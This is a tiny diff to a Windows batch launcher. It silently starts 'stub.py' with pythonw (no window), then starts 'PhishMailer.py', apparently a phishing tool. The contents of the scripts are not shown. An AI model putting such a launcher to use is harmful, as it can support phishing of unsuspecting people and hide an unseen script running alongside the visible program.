@@ -1,4 +1,4 @@
 @echo off
 start pythonw stub.py
-python PhishMailer.py
+start python PhishMailer.py
 exit
